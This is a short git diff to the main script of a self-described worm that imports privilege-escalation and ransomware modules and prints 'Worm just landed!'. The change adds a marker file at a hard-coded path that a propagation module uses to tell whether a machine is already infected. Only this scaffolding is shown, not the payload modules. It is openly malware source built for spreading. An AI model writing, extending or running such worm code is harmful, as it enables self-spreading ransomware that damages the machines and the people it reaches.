@@ -2,6 +2,7 @@
 ####################################################     LIBRARIES     ####################################################
 ###########################################################################################################################
 
+import os
 from time import sleep
 
 from modules import privesc
@@ -17,7 +18,7 @@ from modules import ransomware
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-
+NO_INFECTION_FILE = "/home/aleix/GR0up7.pem"
 
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
@@ -25,6 +26,10 @@ from modules import ransomware
 
 def main():
     print("Worm just landed!")
+
+    # Creates a file for the propagation module to identify whether a computer is already infected or not   
+    if not(os.path.exists(NO_INFECTION_FILE)):
+        with open(NO_INFECTION_FILE, 'w') as file: pass
 
     # Map modules to function
     modules = {
